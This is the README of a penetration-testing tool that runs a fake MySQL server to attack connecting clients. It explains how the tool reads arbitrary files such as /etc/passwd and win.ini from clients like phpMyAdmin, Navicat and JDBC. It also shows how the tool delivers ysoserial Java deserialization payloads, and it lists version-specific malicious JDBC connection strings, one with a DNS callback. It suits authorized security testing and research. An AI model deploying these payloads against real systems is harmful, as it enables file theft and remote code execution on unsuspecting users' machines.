# MySQL Fake Server
A fake MySQL Server used for penetration,which is implemented by  native python3 with out any other dependency package.

Modified from Poject:https://github.com/waldiTM/python-mysqlproto

## Use

1. MySQL Client Arbitrary File Reading Exploit
2. MySQL JDBC Client's Java Deserialization Vulnerable Exploit

## Description
1. Python3 Environment ，no need to install other package.
2. Run Command：`python server.py`
3. [Ysoserial](https://github.com/frohoff/ysoserial) is required to use the deserialization Exploit，Support Attributes`ServerStatusDiffInterceptor` and `detectCustomCollations`.
4. MySQL user name supports special symbols such as colons and slashes, but whether it can be used depends on the specific client environment.
5. **Recommended usage:**config.json contains some preset information, you can modify and add the File Reading and yso parameters corresponding to the specified user name by yourself. See the following instructions for details
6. According to the **login user name** to return the File Reading Exploit packet or deserialize Exploit packet.

## Test Environment：
1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Deserialization on Windows（JRE8u20）、File Reading)
2. PHPMyAdmin(File Reading on Windows  an Linux，can use relative path to read php file)
3. Navicat 12(File Reading on Windows，nead switch to mysql_clear_password Authentication plugin)

## Instructions
Default config.json:

```json
{
     "config":{
        "ysoserialPath":"ysoserial-0.0.6-SNAPSHOT-all.jar", //YsoSerial Location
        "javaBinPath":"java",//java Command Location
        "fileOutputDir":"./fileOutput/",//File Save Directory
        "displayFileContentOnScreen":true,//Whether to preview the content of the output file to the console
        "saveToFile":true//Whether to save the file
    },
//File Reading Params
    "fileread":{
        "win_ini":"c:\\windows\\win.ini",//key is username,value is the path for file reading
        "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
        "win":"c:\\windows\\",
        "linux_passwd":"/etc/passwd",
        "linux_hosts":"/etc/hosts",
        "index_php":"index.php",
        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]//Randomly select files to read in case of unknown user name
    },
//ysoserial Params
    "yso":{
        "Jdk7u21":["Jdk7u21","calc"]//key is username,value is ysoserial's run params.
    }
}
```

1. File Reading Exploit：

    - The filepath to be read can be predefined in the fileread section of config.json(e.g.:  use username `win_ini`to read `win.ini`)
    - Can use the username starting with fileread_(e.g.:use username `fileread_/etc/passwd` to read `/etc/passwd`)
    - Some new version restrict read local file, add `allowLoadLocalInfile=true` option to allow read local file. E.g: jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&user=win_hosts

2. Deserialize Exploit:
    - The yso payload generation parameters can be predefined in the yso section in config.json(e.g. username `Jdk7u21` return Jdk7u21 gadget with open calculator)

    - Can use the username starting with `yso_`.The format is `yso_payloadType_command`（e.g: yso_Jdk7u21_calc）

      JDBC connection string examples：

      - `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
      - `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`

3. About authentication：The default authentication plugin is **mysql_native_password**,But due to the bugs of protocol implementation，it will  connect failed with Navicat client.

    At this time, append **_clear** to the username for switch the  authentication plugin to **mysql_clear_password**, and the Navicat client will connect to fake server successfull and get the file content.

    - **e.g.：** fileread\_/etc/passwd_clear

## JDBC Connection Strings

I sorted JDBC Connection Strings out  while writing the analysis：https://www.anquanke.com/post/id/203086
Please refer to the above description to modify the username.

### ServerStatusDiffInterceptor Attribute Exploit:

- **8.x:** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`

- **6.x(Attribute name is different):** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`

- **5.1.11 and above 5.x version（package name with out "cj"）:**` jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`

- **5.1.10 and below 5.1.X version：** Same as above， But you need to execute arbitrary query after connecting。

- **5.0.x:** No`ServerStatusDiffInterceptor`Attribute yet.┓( ´∀` )┏

### detectCustomCollations Attribute Exploit：

- **5.1.41 and above:** unavailable

- **5.1.29-5.1.40:** `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`

- **5.1.28-5.1.19：** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc`

- **5.1.x versions below 5.1.18：** unavailable

- **Version 5.0.x is not available** 

## Some Examples

Navicat File Reading Exploit（username is win_ini_clear）

![image-20200414150112426](README.assets/image-20200414150112426.png)

JDK 1.8.20+mysql-connector-java 8.0.14 Deserialization Exploit，(username is yso_JRE8u20_calc)

![image-20200414150417471](README.assets/image-20200414150417471.png)

## Some pits in coding

1. About `SHOW VARIABLES `
   - Two columns are required, otherwise an exception will be throwed.
   - When JDBC is connected, the server variables are obtained by calling `SHOW VARIABLES`, the most important variables  are two time zone variables `system_time_zone` and `time_zone`. In the getObject function, the time zone related information is needed, without these two will throw an exception.
2. Jdbc's Blob judgment condition is that the field type is blob, the org_table field declared by the field is not empty, and flags is greater than 128, otherwise it will be parsed as text（Function`findMysqlType` in Class `com.mysql.cj.protocol.a.NativeProtocol`）
3. Sequence order detection in Orignal `python-mysqlproto` Project need to be removed，otherwise an exception will be throwed.（There should be a unfound problem that caused the serial number to be reset）。
4. `SHOW SESSION STATUS`and`SHOW COLLATION`'s share column is the second column.
5. In the environment of mysql java connector 5.x, the server version returned by server need to be greater than or equal to 5.0.0 ,and execution flow will enter into `Util.resultSetToMap` and then into `getObject`

## Reference

**Project basis：**

https://github.com/waldiTM/python-mysqlproto

**Vulnerability related:**

https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf

https://paper.seebug.org/1112/

https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload

**Agreement related：**

https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html

https://dev.mysql.com/doc/internals/en/character-set.html

https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Data

## 404Starlink
<img src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png" width="30%">

MySQL_Fake_Server has joined [404Starlink](https://github.com/knownsec/404StarLink)
